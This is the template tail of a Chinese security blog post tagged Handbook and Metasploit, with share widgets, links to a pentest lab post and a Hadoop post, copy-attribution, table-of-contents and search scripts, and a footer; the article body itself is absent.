            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/Handbook/">
                                    <span class="chip bg-color">Handbook</span>
                                </a>
                            
                                <a href="/tags/Metasploit/">
                                    <span class="chip bg-color">Metasploit</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
            <div class="card">
                <a href="/2020/06/22/pentesting1/">
                    <div class="card-image">
                        
                        <img src="/medias/featureimages/pentest-1.png" class="responsive-img" alt="从0到1学会搭建小型企业拓扑到由外向内的渗透测试">
                        
                        <span class="card-title">从0到1学会搭建小型企业拓扑到由外向内的渗透测试</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            最近的一个培训活动，需要搭建一个小型企业网络环境，并针对整个企业环境做一个渗透测试评估，包括从企业网络拓扑规划、部署到企业网络内外网的渗透测试，整个详细过程如下。
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2020-06-22
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/" class="post-category">
                                    攻防渗透
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/">
                        <span class="chip bg-color">攻防渗透</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                Next&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2020/06/06/big-data-hadoop/">
                    <div class="card-image">
                        
                        <img src="/medias/featureimages/big-data-1.jpg" class="responsive-img" alt="Big Data Hadoop">
                        
                        <span class="card-title">Big Data Hadoop</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            Hadoop是一个由Apache基金会所开发的分布式系统基础架构。用户可以在不了解分布式底层细节的情况下，开发分布式程序。充分利用集群的威力进行高速运算和存储。
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2020-06-06
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/" class="post-category">
                                    安全建设
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/">
                        <span class="chip bg-color">大数据</span>
                    </a>
                    
                    <a href="/tags/Hadoop/">
                        <span class="chip bg-color">Hadoop</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + 'From: Qftm<br />'
            + 'Author: Qftm<br />'
            + 'Link: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


<!-- 代码块折行 -->

<style type="text/css">
code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
</style>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h1, h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h1, h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
    <div class="container row center-align" style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            <span id="year">2018</span>
            <a href="/about" target="_blank">Qftm</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">370.8k</span>&nbsp;字
            
            
            
            
            
            <br>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link ">
    <a href="https://github.com/Qftm" 
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:Qftmbin@gmail.com" 
        <i class="fas fa-envelope-open"></i>
    </a>





    <a href="https://twitter.com/Qftmer" 
        <i class="fab fa-twitter"></i>
    </a>









</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
$(function () {
    searchFunc("/search.xml", 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    

    

    

    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
